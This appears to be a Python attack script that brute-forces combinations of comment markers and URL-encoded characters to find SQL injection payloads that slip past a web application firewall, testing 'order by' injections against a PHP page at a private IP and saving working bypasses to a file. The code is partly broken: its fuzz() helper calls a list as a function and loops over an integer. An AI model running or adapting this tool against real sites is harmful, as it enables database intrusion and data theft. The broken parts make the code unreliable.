#! /usr/bin/env python
#-*- coding:utf-8 -*-

import requests
from bs4 import BeautifulSoup
import random

Fuzz_a = ['/*!','*/','/**/','/','?','~','!','.','%','-','*','+','=','@','--+a','--+','|','.',',','/','#','(',')']
Fuzz_b = ['']
Fuzz_c = ['%0a','%0b','%0c','%0d','%0e','%0f','%0h','%0i','%0j','%09','/*!12345']
FUZZ = Fuzz_a+Fuzz_b+Fuzz_c
#url = "http://192.168.2.132/sql_id.php?id=1{}order{}by{}1"
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}
def fuzz(num):
	string = []
	payload = string([string.append(random.choice(FUZZ)) for i in num])


if __name__ == "__main__":
	while True:
		#payload = ''
		# for i in range(5):
		#	payload += random.choice(FUZZ)
		for a in FUZZ:
			for b in FUZZ:
				for c in FUZZ:
					for d in FUZZ:
						for e in FUZZ:
							payload = a+b+c+d+e
							#print(payload)
							url = 'http://192.168.2.132/sql_id.php?id=1%sorder%sby%s1' % (payload,payload,payload)
							data=requests.get(url,headers)
							if 'zhangsan' in data.text:
								url2 = 'http://192.168.2.132/sql_id.php?id=1%sorder%sby%s0' % (payload,payload,payload)
								data2 = requests.get(url2,headers)
								if 'zhangsan' not in data2.text:
									print(data2)
									print('[*]payload:'+url+u'成功过狗')
									file = open('payload.txt','a')
									file.write(url+'\n ')
									file.close()
								else:
									print('Nothing!!!')
